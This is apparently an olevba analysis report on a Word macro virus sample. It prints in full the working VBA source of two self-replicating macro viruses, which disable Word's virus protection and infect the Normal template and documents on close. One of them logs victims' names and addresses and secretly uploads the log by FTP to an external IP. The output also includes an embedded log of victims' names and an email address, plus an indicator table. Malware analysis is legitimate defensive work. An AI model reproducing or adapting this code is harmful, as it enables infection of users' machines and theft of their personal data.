olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.fq2-eb89f732867e580e89c792749b58557d39d00cde
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.fq2-eb89f732867e580e89c792749b58557d39d00cde - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()

On Error Resume Next

Const Marker = "<- this is another marker!"

'Declare Variables
Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
Dim ad, nt As Object
Dim OurCode, UserAddress, LogData, LogUploaded As String

'Initialize Variables
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)

DocumentInfected = ad.CodeModule.Find(Marker, 1, 1, 10000, 10000)
NormalTemplateInfected = nt.CodeModule.Find(Marker, 1, 1, 10000, 10000)


'Switch the VirusProtection OFF
Options.VirusProtection = False


  If (Day(Now()) = 1) And (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogUploaded") = False) Then
  
    If DocumentInfected = True Then
      LogData = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)
    ElseIf NormalTemplateInfected = True Then
      LogData = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)
    End If
    
    LogData = Mid(LogData, InStr(1, LogData, "' Log" & "file -->"), Len(LogData) - InStr(1, LogData, "' Log" & "file -->"))
    
    Randomize
    
    For i = 1 To 4
      LogFile = LogFile + Mid(Str(Int(8 * Rnd)), 2, 1)
    Next i
    LogFile = "C:\hsfx" & LogFile & ".sys"
    
    Open LogFile For Output As #1
    Print #1, LogData
    Close #1
    
    Open "c:\netldx.vxd" For Output As #1
    Print #1, "o 209.201.88.110"
    Print #1, "user anonymous"
    Print #1, "pass itsme@"
    Print #1, "cd incoming"
    Print #1, "ascii"
    Print #1, "put " & LogFile
    Print #1, "quit"
    Close #1
    
    Shell "command.com /c ftp.exe -n -s:c:\netldx.vxd", vbHide
    
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogUploaded") = True
  ElseIf Day(Now()) <> 1 Then
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogUploaded") = False
  End If


'Make sure that some conditions are true before we continue infecting anything
If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
   
  'Infect the NormalTemplate
  If DocumentInfected = True Then
  
    SaveNormalTemplate = NormalTemplate.Saved
  
    OurCode = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)

    
    'Write a log file of this NormalTemplate infection
    For i = 1 To Len(Application.UserAddress)
      If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
        If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
          UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
        End If
      Else
        UserAddress = UserAddress & Chr(13) & "' "
      End If
    Next i

    OurCode = OurCode & Chr(13) & _
              "' " & Format(Time, "hh:mm:ss AMPM - ") & _
                     Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
              "' " & Application.UserName & Chr(13) & _
              "' " & UserAddress & Chr(13)


    nt.CodeModule.DeleteLines 1, nt.CodeModule.CountOfLines
    nt.CodeModule.AddFromString OurCode
    
    If SaveNormalTemplate = True Then NormalTemplate.Save
    
  End If


  'Infect the ActiveDocument
  If NormalTemplateInfected = True And _
     (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
     ActiveDocument.Saved = False) Then
  
    SaveDocument = ActiveDocument.Saved
    
    OurCode = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)

    ad.CodeModule.DeleteLines 1, ad.CodeModule.CountOfLines
    ad.CodeModule.AddFromString OurCode
    
    If SaveDocument = True Then ActiveDocument.Save
      
  End If
  
    
End If

End Sub

' Logfile -->

' 10:19:17  - Freitag, 11 Dez 1998
' SPo0Ky
' Blue Planet
'



' 10:57:54 PM - Sunday, 13 Dec 1998
' Samir Al-Latifi
'



' 02:14:27  - woensdag, 20 jan 1999
' Hogeschool van Amsterdam
'



' 05:46:54  - woensdag, 20 jan 1999
' Hogeschool van Amsterdam
'


' 10:59:36  - maandag, 25 jan 1999
' Hogeschool van Amsterdam
'



' 11:56:48  - maandag, 8 mrt 1999
' Hogeschool van Amsterdam
'



' 11:19:34  - dinsdag, 16 mrt 1999
' Hogeschool van Amsterdam
'



' 06:56:11  - donderdag, 18 mrt 1999
' Nils Vallentgoed
' CONFIDENTIAL



' 08:33:07  - maandag, 22 mrt 1999
' H. Westerink
'



' 04:55:11  - dinsdag, 6 apr 1999
' Godfried Bomansschool
'



' 05:58:06  - zondag, 18 apr 1999
' Hassink
'



' 03:03:03  - maandag, 10 mei 1999
' Shop Zernike
'



' 01:47:22  - dinsdag, 11 mei 1999
' Copyprofs
'



' 03:05:40  - dinsdag, 18 mei 1999
' Bedrijfskunde
'



' 02:40:01  - donderdag, 20 mei 1999
' Bedrijfskunde
'



' 12:20:55  - maandag, 14 jun 1999
' van der Kolk
'



' 11:51:59  - maandag, 28 jun 1999
' van der Kolk
'



' 03:12:36  - dinsdag, 24 aug 1999
' Hotze Buwalda
'



' 07:33:56  - woensdag, 27 okt 1999
' hbuwalda
'



' 12:41:31  - woensdag, 3 nov 1999
' helpdesk
'



' 10:56:26  - dinsdag, 14 dec 1999
' helpdesk
'



' 12:36:40  - dinsdag, 14 dec 1999
' helpdesk
'



' 02:02:10  - woensdag, 29 dec 1999
' sbosma
'



' 05:59:31  - zondag, 20 feb 2000
' Gooitsen de Vries
'



' 08:19:12  - woensdag, 1 mrt 2000
' Sandra de Vries
'



' 11:22:16  - maandag, 12 jun 2000
' Johan Poelman
'



' 01:20:02  - woensdag, 13 sep 2000
' Willem van der Horst
'



' 12:04:32  - dinsdag, 17 okt 2000
' Willem van der Horst
'



' 02:08:45  - woensdag, 15 nov 2000
' Willem van der Horst
'



' 03:58:11  - vrijdag, 10 nov 2000
' Gerben Bergman
' G_Bergman29@hotmail.com



' 02:18:50  - zaterdag, 2 dec 2000
' Plat
'



' 02:27:14  - zondag, 31 dec 2000
' Jacob Plat
'



' 06:37:48  - maandag, 28 mei 2001
' J.Plat
'



' 08:55:45  - vrijdag, 5 okt 2001
' Willem van der Horst
'



' 01:13:01  - woensdag, 14 nov 2001
' Willem van der Horst
'



' 02:35:43  - vrijdag, 16 nov 2001
' Willem van der Horst
'



' 01:37:23  - donderdag, 22 nov 2001
' Willem van der Horst
'



' 07:51:52  - maandag, 3 dec 2001
' dave
'



' 12:26:38  - maandag, 7 jan 2002
' Willem van der Horst
'



' 12:51:14  - dinsdag, 26 feb 2002
' Willem van der Horst
'



' 09:09:32  - woensdag, 3 apr 2002
' Willem van der Horst
'



' 01:18:44  - woensdag, 15 mei 2002
' Willem van der Horst
'



' 10:58:21  - woensdag, 25 sep 2002
' Willem van der Horst
'



' 12:47:39  - maandag, 30 sep 2002
' Fam. Lycklema
'



' 10:36:24  - woensdag, 2 apr 2003
' Bureau Automatisering
'



' 10:19:01  - woensdag, 9 apr 2003
' Bureau Automatisering
'



' 09:10:21  - donderdag, 10 apr 2003
' Bureau Automatisering
'



' 10:37:16  - donderdag, 17 apr 2003
' Bureau Automatisering
'



' 11:56:01  - woensdag, 14 mei 2003
' Bureau Automatisering
'



-------------------------------------------------------------------------------
VBA MACRO Arbind2000.bas 
in file: Virus.MSWord.Marker.fq2-eb89f732867e580e89c792749b58557d39d00cde - OLE stream: 'Macros/VBA/Arbind2000'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'arbind2000
'An experiment in Macro programming ;)
'Minimum stealth, no encryption, No payload, No mail replication
'If you had looked you could have found and deleted it but..
'You probably never knew it was here!
  On Error Resume Next
  Application.Options.VirusProtection = False
  Application.Options.SaveNormalPrompt = False
  Application.Options.ConfirmConversions = False
  Dim x As Integer
  Dim found As Boolean
  found = False
  x = 1
  For x = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents.Item(x).CodeModule.Lines(2, 1) = "'arbind2000" Then found = True
  Next x
  If Not found Then
    Application.OrganizerCopy ActiveDocument.FullName, NormalTemplate.FullName, "arbind2000", wdOrganizerObjectProjectItems
  End If
  If NormalTemplate.Saved = False Then NormalTemplate.Save
  
  found = False
  x = 1
  For x = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents.Item(x).CodeModule.Lines(2, 1) = "'arbind2000" Then found = True
  Next x
  If Not found Then
    NormalTemplate.VBProject.VBComponents("arbind2000").Export ("c:\arbind2000.tmp")
    ActiveDocument.VBProject.VBComponents.Import ("c:\arbind2000.tmp")
    ActiveDocument.SaveAs ActiveDocument.FullName
    Kill ("c:\arbind2000.tmp")
  End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |209.201.88.110      |IPv4 address                                 |
|IOC       |ftp.exe             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

